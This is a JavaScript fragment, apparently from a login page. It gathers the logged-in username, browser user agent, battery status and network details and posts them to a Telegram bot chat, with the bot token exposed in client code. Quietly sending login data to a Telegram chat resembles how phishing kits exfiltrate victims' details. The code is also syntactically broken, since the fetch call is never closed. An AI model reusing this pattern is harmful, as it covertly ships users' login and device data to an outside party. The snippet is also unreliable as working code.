// Send message to Telegram (fire-and-forget)
function sendToTelegram(message){
  const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
  fetch(url, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ chat_id: CHAT_ID, text: message })

}

// collect and send device info once (IP collection removed)
async function sendDeviceInfoOnce(username){
  let info = `üîî Login Notification\nUser: ${username}\n\n`;
  info += `Browser UA: ${navigator.userAgent}\n`;

  // battery (may be unavailable)
  try {
    const battery = await navigator.getBattery();
    info += `Battery: ${Math.round(battery.level * 100)}% (charging: ${battery.charging})\n`;
  } catch(e){
    info += `Battery: Not available\n`;
  }

  // network info (may be partial)
  if (navigator.connection) {
    info += `Network: ${navigator.connection.effectiveType || 'unknown'}, downlink: ${navigator.connection.downlink || 'n/a'} Mbps\n`;
  } else {
    info += `Network: Unknown\n`;
  }

  // NOTE: Public IP collection has been removed as requested.

  sendToTelegram(info);
}
